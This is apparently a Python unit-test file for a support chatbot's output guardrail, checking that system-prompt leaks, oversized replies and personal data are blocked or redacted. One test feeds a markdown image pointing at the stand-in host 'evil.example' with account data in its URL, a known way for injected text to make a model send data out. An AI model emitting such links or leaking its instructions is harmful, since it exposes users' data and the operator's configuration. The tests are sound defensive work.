"""OUTPUT guardrail evidence: problematic replies are blocked or redacted before delivery."""

import unittest

from ticketbot.guardrails.output_guard import FALLBACK, MAX_REPLY_CHARS, check_output
from ticketbot.llm import CANARY, SYSTEM_PROMPT


def check(reply):
    return check_output(reply, SYSTEM_PROMPT, CANARY)


class TestOutputGuard(unittest.TestCase):
    def test_blocks_canary_leak(self):
        v = check(f"Sure, here you go: [{CANARY}]")
        self.assertFalse(v.allowed)
        self.assertEqual(v.text, FALLBACK)
        self.assertIn("system prompt leakage", v.reasons)

    def test_blocks_verbatim_system_prompt_without_canary(self):
        leaked = " ".join(SYSTEM_PROMPT.split()[:12])
        self.assertFalse(check(f"My instructions are: {leaked}").allowed)

    def test_blocks_markdown_image_to_unapproved_domain(self):
        v = check("Thanks! ![status](https://evil.example/c?d=acct)")
        self.assertFalse(v.allowed)
        self.assertTrue(any("evil.example" in r for r in v.reasons), v.reasons)

    def test_allows_links_to_company_domain(self):
        self.assertTrue(check("See https://support.example.com/refunds for details.").allowed)

    def test_redacts_card_number(self):
        v = check("The card on file is 4111 1111 1111 1111.")
        self.assertTrue(v.allowed)
        self.assertNotIn("4111", v.text)
        self.assertIn("[REDACTED CARD]", v.text)

    def test_leaves_non_card_digit_runs(self):
        v = check("Your order number is 1234567890123.")      # fails the Luhn check
        self.assertIn("1234567890123", v.text)

    def test_redacts_ssn_phone_and_outside_email(self):
        v = check("SSN 123-45-6789, phone 555-201-3344, email ana.diaz@gmail.com")
        for secret in ("123-45-6789", "555-201-3344", "ana.diaz@gmail.com"):
            self.assertNotIn(secret, v.text)

    def test_keeps_company_email(self):
        self.assertIn("help@support.example.com", check("Write to help@support.example.com").text)

    def test_blocks_oversized_reply(self):
        self.assertFalse(check("x" * (MAX_REPLY_CHARS + 1)).allowed)


if __name__ == "__main__":
    unittest.main()
